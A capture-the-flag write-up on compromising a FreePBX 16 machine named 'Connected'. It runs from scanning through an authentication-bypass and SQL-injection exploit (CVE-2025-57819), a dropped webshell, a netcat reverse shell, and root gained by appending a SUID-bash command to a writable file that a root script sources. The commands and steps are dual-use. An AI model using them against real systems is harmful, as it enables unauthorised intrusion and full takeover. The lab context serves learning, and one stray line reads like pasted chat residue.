# Connected

### Enumeration

I started with an Nmap scan against the target:

```bash
nmap -p22,80,443 10.129.245.100 -Pn -sCV
```

The scan identified three open ports:

```bash
22/tcp  open  ssh       OpenSSH 7.4
80/tcp  open  http      Apache httpd 2.4.6
443/tcp open  ssl/https Apache httpd 2.4.6
```

The HTTP service on port 80 redirected to:

```bash
http://connected.htb/
```

The web server was running:

```bash
Apache 2.4.6
PHP 7.4.16
CentOS
```

The HTTPS service also exposed Apache, and the TLS certificate contained the hostname `pbxconnect`.

I added the hostname to my `/etc/hosts` file:

```bash
10.129.245.100 connected.htb
```

### Web Enumeration

Browsing to `http://connected.htb/` revealed a **FreePBX** installation.

The FreePBX version exposed by the application was:

```bash
FreePBX 16.0.40.7
```

Since the application version was known, I searched for publicly documented vulnerabilities affecting this version.

Two useful sources stood out:

* watchTowr's FreePBX CVE-2025-57819 detection/exploitation research
* Horizon3.ai's research covering FreePBX authentication bypass and SQL injection vulnerabilities

The interesting attack chain involved FreePBX's authentication mechanism and ultimately provided SQL injection that could be leveraged toward remote code execution.

### FreePBX Authentication Bypass / SQL Injection

The research described a vulnerability involving the `webserver` authentication type.

The important behavior was that FreePBX could trust a username supplied through an HTTP `Authorization` header when the relevant authentication configuration was in place.

The forged header used during testing was:

```
Authorization: Basic YWRtaW46YWRtaW4=
```

which corresponds to:

```
admin:admin
```

The vulnerable Endpoint Manager functionality was accessed through:

```
/admin/config.php?display=endpoint&view=customExt
```

Testing the `id` parameter with a quote demonstrated the SQL injection behavior described by the research.

This provided a path from the authentication bypass to SQL injection and eventually arbitrary command execution.

### Exploitation

Rather than manually reproducing the entire exploit chain, I used the publicly available watchTowr detection artifact:

```
watchTowr-vs-FreePBX-CVE-2025-57819.py
```

The script successfully detected that the target was vulnerable and generated a webshell.

The output confirmed:

```
[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found:
http://connected.htb/this-is-an-ioc-not-actually-watchTowr-lht6ih0dxz.php?cmd=hostname
```

At this point I had command execution on the target through the generated webshell.

The script also warned:

```
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
```

This is worth noting because the exploit itself creates a malicious cron-related artifact as part of its execution chain.

### Obtaining a Reverse Shell

With command execution available through the webshell, I started a Netcat listener on my Kali machine:

```
nc -lvnp 4444
```

My HTB VPN address was:

```
10.10.17.238
```

I then used the webshell to execute a Bash reverse shell connecting back to my Kali machine on port 4444.

The connection succeeded:

```
connect to [10.10.17.238] from (UNKNOWN) [10.129.245.100] 41878
```

The resulting shell identified itself as:

```
[asterisk@connected html]$
```

I confirmed that I had landed in the web root:

```
ls
```

which showed:

```
admin
index.php
restapps
robots.txt
this-is-an-ioc-not-actually-watchTowr-lht6ih0dxz.php
```

The reverse shell therefore gave me command execution as the **`asterisk` user**.

### Initial Access

At this point the initial foothold was established:

```
Target: 10.129.245.100
Hostname: connected.htb
Service: FreePBX 16.0.40.7
Initial Access: FreePBX CVE-2025-57819
Shell: Reverse shell
User: asterisk
Working directory: /var/www/html
```

Python was not installed on the target, so the usual Python PTY upgrade was unavailable. However, `script` was present:

```
which script
```

returned:

```
/usr/bin/script
```

This can be used to improve the interactive shell before beginning privilege-escalation enumeration.

The next stage is to enumerate the `asterisk` account and identify a path to root.

### Privilege Escalation

With a shell as the `asterisk` user, I started enumerating possible privilege-escalation paths.

```
sudo -l
```

`sudo` required the `asterisk` user's password, so this was not immediately useful.

I then checked for SUID binaries:

```
find / -perm -4000 -type f 2>/dev/null
```

Nothing immediately stood out as an obvious path to root. I also checked Linux capabilities, but there was no directly exploitable capability assigned to the `asterisk` user.

#### Incron

While enumerating scheduled tasks, I noticed that the machine was using **incron**, an inotify-based alternative to cron.

```
ls -la /etc/incron.d/
```

The configuration contained several interesting entries:

```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

This was interesting because the watched `/var/spool/asterisk/sysadmin` directory was accessible to the `asterisk` user.

I inspected the helper:

```
cat /usr/sbin/sysadmin_dahdi_restart
```

It contained:

```
#!/bin/sh

/etc/init.d/asterisk stop

sleep 5

/etc/init.d/dahdi restart

sleep 5

export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```

The important part was:

```
/etc/init.d/dahdi restart
```

Since `dahdi` was restarted by a root-owned script, I inspected its initialization script.

#### DAHDI Initialization

```
cat /etc/init.d/dahdi
```

Among other things, it contained:

```
[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

The `.` command sources the contents of `init.conf` into the current shell.

I then checked its permissions:

```
ls -la /etc/dahdi/init.conf
```

The file was writable by `asterisk`:

```
-rw-r--r--. 1 asterisk asterisk ... /etc/dahdi/init.conf
```

This gave me the complete privilege-escalation chain:

```
asterisk
   |
   v
write to /var/spool/asterisk/sysadmin/dahdi_restart
   |
   v
incron detects IN_CLOSE_WRITE
   |
   v
/usr/sbin/sysadmin_dahdi_restart
   |
   v
/etc/init.d/dahdi restart
   |
   v
/etc/dahdi/init.conf is sourced
   |
   v
attacker-controlled commands execute as root
```

The uploaded writeup confirms this exact chain and the writable `init.conf` primitive. Pasted text

#### Obtaining Root

Instead of using a reverse shell, I used the sourced configuration file to create a SUID copy of `/bin/bash`.

First, I made sure the previous reverse-shell payload was removed from `init.conf`. This was important because the earlier reverse-shell attempt could interfere with execution of subsequent commands.

Then I appended:

```
printf '\ninstall -m 4755 /bin/bash /home/asterisk/pwn1\n' >> /etc/dahdi/init.conf
```

I triggered the incron rule by writing to the watched file:

```
echo restart > /var/spool/asterisk/sysadmin/dahdi_restart
```

After waiting approximately 20–25 seconds, I checked whether the SUID binary had been created:

```
ls -la /home/asterisk/pwn1
```

The resulting file was owned by root and had the SUID bit set:

```
-rwsr-xr-x 1 root root ... /home/asterisk/pwn1
```

I could then execute it with Bash's `-p` option:

```
/home/asterisk/pwn1 -p
```

Finally:

```
id
```

returned:

```
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk) euid=0(root)
```

The effective UID was `0`, giving me a root shell.

I verified root access:

```
cat /root/root.txt
```

And retrieved the root flag.

#### Root Cause

The privilege escalation was possible because a root-executed DAHDI initialization script sourced a configuration file that was writable by the low-privileged `asterisk` user.

The vulnerable trust chain was:

```
Writable configuration
        ↓
/etc/dahdi/init.conf
        ↓
sourced by root
        ↓
/etc/init.d/dahdi
        ↓
triggered through sysadmin_dahdi_restart
        ↓
triggered by incron
        ↓
asterisk-controlled file write
        ↓
root command execution
```
